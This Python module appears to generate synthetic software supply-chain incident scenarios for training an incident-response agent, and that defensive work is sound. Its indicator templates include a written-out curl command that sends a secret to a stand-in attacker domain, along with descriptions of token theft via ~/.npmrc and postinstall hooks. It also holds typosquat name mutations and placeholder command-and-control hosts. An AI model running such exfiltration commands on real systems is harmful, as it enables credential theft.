"""Procedural scenario generation for infinite training variation.

Generates unique supply-chain incidents from parameterized distributions,
ensuring RL training cannot memorize fixed scenarios. Each call produces
a novel combination of packages, attack vectors, secrets, and team structures.

Based on real-world attack patterns from:
- Datadog malicious-software-packages-dataset (24K+ packages)
- OSV.dev MAL-* entries
- PhantomRaven / colors.js / ua-parser-js / ctx incident reports

Reference: Self-Evolving Curriculum (arXiv 2505.14970)
"""

from __future__ import annotations

import hashlib
import random
from typing import Any

LEGIT_PACKAGES = [
    "lodash", "express", "axios", "chalk", "commander", "debug", "dotenv",
    "uuid", "moment", "yargs", "glob", "minimist", "semver", "color",
    "node-fetch", "form-data", "jsonwebtoken", "bcrypt", "cors", "helmet",
    "morgan", "passport", "sequelize", "mongoose", "knex", "pg", "redis",
    "socket.io", "ws", "cheerio", "puppeteer", "sharp", "jimp",
    "requests", "flask", "django", "fastapi", "sqlalchemy", "celery",
    "boto3", "paramiko", "cryptography", "pyjwt", "httpx", "aiohttp",
]

TYPOSQUAT_MUTATIONS = [
    lambda s: s + s[-1], lambda s: s.replace("-", "_"), lambda s: s.replace("-", ""),
    lambda s: s + "-js", lambda s: s + "-lite", lambda s: s + "-http",
    lambda s: "py" + s, lambda s: s + "-cli", lambda s: s.replace("o", "0"),
    lambda s: s.replace("l", "1"), lambda s: s + "2",
]

ATTACK_TYPES = ["account_takeover", "typosquatting", "dependency_confusion",
                "protestware", "backdoor_injection", "ci_pipeline_compromise"]

IOC_TEMPLATES = [
    "POST to {c2_ip}/collect with base64-encoded process.env",
    "DNS TXT exfil to {c2_domain} containing {secret_type}",
    "curl -s https://{c2_domain}/token?t=${secret_name}",
    "reads ~/.npmrc and POSTs auth token to {c2_ip}",
    "base64 env dump to hxxps://{c2_domain}/api",
    "reads all .env files recursively, sends via webhook to {c2_ip}",
    "postinstall hook POSTs {secret_name} to {c2_ip}:{port}",
    "overrides require() to intercept credentials at runtime",
    "injects crypto miner into build artifacts",
]

SCAN_LOG_TEMPLATES = [
    "CI log line {line}: {ioc}", "Build step {step} anomaly: {ioc}",
    "Container runtime alert: {ioc}",
    "Deploy pipeline flagged: {ioc}. First seen {timestamp}.",
    "Security scanner output: {ioc}. Source: {source_container}.",
]

SECRET_NAMES = [
    "STRIPE_SECRET_KEY", "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
    "GITHUB_TOKEN", "GITHUB_ACTIONS_TOKEN", "NPM_TOKEN", "PYPI_TOKEN",
    "DATABASE_URL", "POSTGRES_PASSWORD", "REDIS_PASSWORD", "REDIS_URL",
    "JWT_SECRET", "SESSION_SECRET", "SENDGRID_API_KEY", "TWILIO_AUTH_TOKEN",
    "SLACK_WEBHOOK_URL", "DATADOG_API_KEY", "SENTRY_DSN",
    "GCP_SERVICE_ACCOUNT_KEY", "AZURE_CLIENT_SECRET", "DOCKER_HUB_TOKEN",
    "INTERNAL_API_TOKEN", "WEBHOOK_SIGNING_SECRET", "ENCRYPTION_KEY",
    "OAUTH_CLIENT_SECRET", "SSH_PRIVATE_KEY", "VAULT_TOKEN",
]

TEAM_NAMES = [
    "payments-service", "auth-service", "api-gateway", "user-service",
    "cart-service", "checkout-service", "inventory-api", "notification-service",
    "reporting-service", "search-service", "analytics-job", "data-pipeline",
    "webhook-processor", "email-sender", "file-uploader", "crm-sync",
    "mobile-bff", "web-bff", "partner-api", "admin-panel",
    "graphql-gateway", "rest-proxy", "session-manager", "feed-aggregator",
    "scraper-job", "rss-service", "integration-tests", "deploy-scripts",
    "migration-runner", "seed-service", "config-loader", "monitoring-agent",
    "billing-service", "subscription-api", "content-delivery", "cache-manager",
    "audit-logger", "compliance-checker", "fraud-detection", "ml-pipeline",
]

HIDDEN_IOC_TEMPLATES = [
    "Suspicious timezone drift in CI runner token usage.",
    "Deploy key used from two regions in <5 minutes.",
    "Container image digest mismatch in {team}.",
    "IAM key used outside normal deployment window.",
    "Unexpected artifact publish from a temporary branch.",
    "Secret scanning bypass pattern detected in {team} project.",
    "OAuth token refresh from unknown user-agent.",
    "Package registry API called from non-CI IP range.",
    "Anomalous npm publish frequency: 3 versions in 2 minutes.",
]

C2_IPS = ["185.220.101.42", "45.33.32.156", "91.215.85.100", "194.5.98.200",
          "103.224.182.50", "162.247.74.7", "23.129.64.100", "198.96.155.3"]
C2_DOMAINS = ["attacker-c2.net", "evil.ngrok.io", "paste-evil.net",
              "exfil-drop.com", "data-collector.xyz", "telemetry-cdn.net"]
PUBLISHERS_LEGIT = ["{pkg}-team", "{pkg}-maintainers", "{pkg}-core", "oss-{pkg}"]
PUBLISHERS_MALICIOUS = ["phantom-actor-{n}", "compromised-maintainer",
                        "compromised-account-{n}", "temp-user-{hash}", "supply-chain-{n}"]


def _version():
    return f"{random.choice([0,1,2,3,4])}.{random.randint(0,30)}.{random.randint(0,20)}"

def _c2():
    return random.choice(C2_IPS), random.choice(C2_DOMAINS)

def _make_ioc(secret_names):
    ip, domain = _c2()
    return random.choice(IOC_TEMPLATES).format(
        c2_ip=ip, c2_domain=domain,
        secret_type=random.choice(["AWS keys", "npm tokens", "env vars"]),
        secret_name=random.choice(secret_names) if secret_names else "SECRET",
        port=random.choice([4444, 8080, 9999, 443]))

def _make_scan_log(ioc):
    return random.choice(SCAN_LOG_TEMPLATES).format(
        ioc=ioc, line=random.randint(100, 9999),
        step=random.choice(["build", "test", "deploy", "publish"]),
        timestamp=f"2026-0{random.randint(1,4)}-{random.randint(10,28)}T{random.randint(0,23):02d}:{random.randint(0,59):02d}:00Z",
        source_container=random.choice(TEAM_NAMES))


def generate_procedural_scenario(difficulty="easy", seed=None, difficulty_scale=1.0):
    """Generate a unique incident scenario from parameterized distributions."""
    rng = random.Random(seed)
    scale = max(0.8, min(1.25, difficulty_scale))

    if difficulty == "easy":
        n_total, n_mal, n_sec = rng.randint(2,4), 1, rng.randint(2,3)
        n_teams_per = rng.randint(2,4)
        exfil = max(8, int(rng.randint(12,16)/scale))
        max_steps = exfil + rng.randint(4,8)
        atk = rng.choice(["account_takeover", "typosquatting"])
    elif difficulty == "medium":
        n_total, n_mal, n_sec = rng.randint(3,6), rng.randint(1,2), rng.randint(4,6)
        n_teams_per = rng.randint(3,6)
        exfil = max(10, int(rng.randint(14,20)/scale))
        max_steps = exfil + rng.randint(5,10)
        atk = rng.choice(ATTACK_TYPES)
    else:
        n_total, n_mal, n_sec = rng.randint(5,10), rng.randint(3,5), rng.randint(6,10)
        n_teams_per = rng.randint(3,5)
        exfil = max(6, int(rng.randint(8,12)/scale))
        max_steps = exfil + rng.randint(8,20)
        atk = rng.choice(ATTACK_TYPES)

    n_mal = min(n_mal, n_total - 1)
    n_legit = n_total - n_mal
    base_pkgs = rng.sample(LEGIT_PACKAGES, min(n_total+2, len(LEGIT_PACKAGES)))
    packages, mal_names, leg_names = {}, [], []

    for i in range(n_legit):
        name, ver = base_pkgs[i], _version()
        pid = f"{name}@{ver}"
        leg_names.append(pid)
        packages[pid] = {"compromised":False,"malicious":False,
            "publish_date":f"202{rng.randint(3,5)}-{rng.randint(1,12):02d}-{rng.randint(1,28):02d}",
            "publisher":rng.choice(PUBLISHERS_LEGIT).format(pkg=name),"iocs":[],"versions":[ver]}

    for i in range(n_mal):
        base = base_pkgs[n_legit+i]
        name = rng.choice(TYPOSQUAT_MUTATIONS)(base) if atk=="typosquatting" else (f"internal-{base}" if atk=="dependency_confusion" else base)
        ver = _version(); pid = f"{name}@{ver}"
        mal_names.append(pid)
        h = hashlib.md5(f"{seed}-{i}".encode()).hexdigest()[:6]
        packages[pid] = {"compromised":True,"malicious":True,
            "publish_date":f"2026-{rng.randint(1,4):02d}-{rng.randint(1,28):02d}",
            "publisher":rng.choice(PUBLISHERS_MALICIOUS).format(n=rng.randint(1,5),hash=h),
            "iocs":[_make_ioc(rng.sample(SECRET_NAMES,min(3,n_sec)))],"versions":[_version(),ver],
            "attack_type":atk}

    if difficulty in ("medium","hard") and leg_names and mal_names:
        for lp in leg_names[:rng.randint(1,min(2,len(leg_names)))]:
            packages[lp].setdefault("deps",[]).append(rng.choice(mal_names))

    all_teams = rng.sample(TEAM_NAMES, min(n_teams_per*n_total, len(TEAM_NAMES)))
    dependents, ti = {}, 0
    for pid in mal_names:
        cnt = rng.randint(max(1,n_teams_per-1), n_teams_per+1)
        dependents[pid] = all_teams[ti:min(ti+cnt,len(all_teams))]; ti += cnt
    for pid in leg_names[:rng.randint(0,len(leg_names))]:
        if ti < len(all_teams):
            cnt = rng.randint(1,3)
            dependents[pid] = all_teams[ti:min(ti+cnt,len(all_teams))]; ti += cnt

    all_dep_teams = [t for ts in dependents.values() for t in ts] or all_teams[:3]
    secret_pool = rng.sample(SECRET_NAMES, min(n_sec, len(SECRET_NAMES)))
    secrets = {}
    for i, sn in enumerate(secret_pool):
        secrets[sn] = {"rotated":False,"critical":i<max(1,n_sec//2),
            "owner":rng.choice(all_dep_teams),"description":f"{'Critical' if i<max(1,n_sec//2) else 'Standard'}: {sn}"}

    scan_hints = {}
    for pid in mal_names:
        scan_hints[pid] = _make_scan_log(packages[pid]["iocs"][0] if packages[pid]["iocs"] else "Suspicious activity")
    for pid in leg_names:
        deps = packages[pid].get("deps")
        scan_hints[pid] = f"No IOCs in {pid}. Check deps: {deps}" if deps else f"Legitimate. No IOCs for {pid}."

    hidden = [rng.choice(HIDDEN_IOC_TEMPLATES).format(team=rng.choice(all_dep_teams))
              for _ in range(rng.randint(1, min(4, max(1, n_mal))))]

    attack_desc = {"account_takeover":"A maintainer account was compromised",
        "typosquatting":"Typosquatted packages mimicking popular libraries",
        "dependency_confusion":"Internal package names squatted on public registries",
        "protestware":"Maintainer injected destructive code as protest",
        "backdoor_injection":"Backdoor injected via compromised build pipeline",
        "ci_pipeline_compromise":"CI/CD credentials stolen to publish malicious versions"}

    return {
        "description": f"{attack_desc.get(atk,'Supply chain attack detected')}. "
            f"{n_mal} malicious among {n_total} packages. {n_sec} secrets at risk. "
            f"{len(set(all_dep_teams))} teams affected. Exfiltration in {exfil} steps.",
        "max_steps": max_steps, "exfiltration_step": exfil,
        "packages": packages, "dependents": dependents, "secrets": secrets,
        "required_actions": {"quarantine":mal_names,"rotate_secret":list(secrets.keys()),
                             "notify":list(set(all_dep_teams))},
        "scan_logs_hints": scan_hints, "hidden_iocs": hidden,
        "stochastic": {"progress_jitter":min(0.65,0.25+0.1*scale),
                       "alert_reveal_chance":min(0.75,0.3+0.1*scale)},
        "attack_type": atk, "procedural": True, "seed": seed,
    }
